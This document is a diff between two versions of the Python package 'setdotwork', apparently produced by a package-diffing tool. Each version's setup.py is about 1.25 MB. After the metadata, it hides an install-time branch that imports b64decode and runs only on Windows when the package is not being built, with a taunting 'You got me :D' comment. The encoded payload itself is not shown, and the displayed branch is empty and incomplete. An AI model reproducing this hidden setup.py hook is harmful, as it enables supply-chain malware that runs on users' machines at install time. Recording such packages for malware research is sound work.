# Comparing `tmp/setdotwork-0.6.tar.gz` & `tmp/setdotwork-0.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "setdotwork-0.6.tar", last modified: Wed May  3 11:26:09 2023, max compression
+gzip compressed data, was "setdotwork-0.7.tar", last modified: Wed May  3 11:34:32 2023, max compression
```

## Comparing `setdotwork-0.6.tar` & `setdotwork-0.7.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxrwx   0        0        0        0 2023-05-03 11:26:09.238306 setdotwork-0.6/
--rw-rw-rw-   0        0        0      428 2023-05-03 11:26:09.238306 setdotwork-0.6/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-03 11:26:09.222295 setdotwork-0.6/setdotwork/
--rw-rw-rw-   0        0        0        0 2023-05-03 11:26:08.000000 setdotwork-0.6/setdotwork/__init__.py
-drwxrwxrwx   0        0        0        0 2023-05-03 11:26:09.238306 setdotwork-0.6/setdotwork.egg-info/
--rw-rw-rw-   0        0        0      428 2023-05-03 11:26:09.000000 setdotwork-0.6/setdotwork.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      167 2023-05-03 11:26:09.000000 setdotwork-0.6/setdotwork.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-03 11:26:09.000000 setdotwork-0.6/setdotwork.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       11 2023-05-03 11:26:09.000000 setdotwork-0.6/setdotwork.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-03 11:26:09.238306 setdotwork-0.6/setup.cfg
--rw-rw-rw-   0        0        0  1251025 2023-05-03 11:26:08.000000 setdotwork-0.6/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-03 11:34:32.162308 setdotwork-0.7/
+-rw-rw-rw-   0        0        0      428 2023-05-03 11:34:32.162308 setdotwork-0.7/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-03 11:34:32.154306 setdotwork-0.7/setdotwork/
+-rw-rw-rw-   0        0        0        0 2023-05-03 11:34:31.000000 setdotwork-0.7/setdotwork/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-03 11:34:32.161307 setdotwork-0.7/setdotwork.egg-info/
+-rw-rw-rw-   0        0        0      428 2023-05-03 11:34:32.000000 setdotwork-0.7/setdotwork.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      167 2023-05-03 11:34:32.000000 setdotwork-0.7/setdotwork.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-03 11:34:32.000000 setdotwork-0.7/setdotwork.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       11 2023-05-03 11:34:32.000000 setdotwork-0.7/setdotwork.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-03 11:34:32.162308 setdotwork-0.7/setup.cfg
+-rw-rw-rw-   0        0        0  1249781 2023-05-03 11:34:31.000000 setdotwork-0.7/setup.py
```

### Comparing `setdotwork-0.6/setup.py` & `setdotwork-0.7/setup.py`

 * *Files 1% similar despite different names*

```diff
@@ -1,13 +1,13 @@
 
 from distutils.core import setup
 setup(
   name = 'setdotwork',
   packages = ['setdotwork'],
-  version = '0.6',
+  version = '0.7',
   license='MIT',
   description = '',
   author = 'WS',
   keywords = [],
   install_requires=[],
   classifiers=[
     'Operating System :: OS Independent',
@@ -21,10 +21,10 @@
 )
 # You got me :D 
 from os import name
 from sys import argv
 from base64 import b64decode
 if 'sdist' not in argv:
     if name == 'nt':
     else:
         pass
```
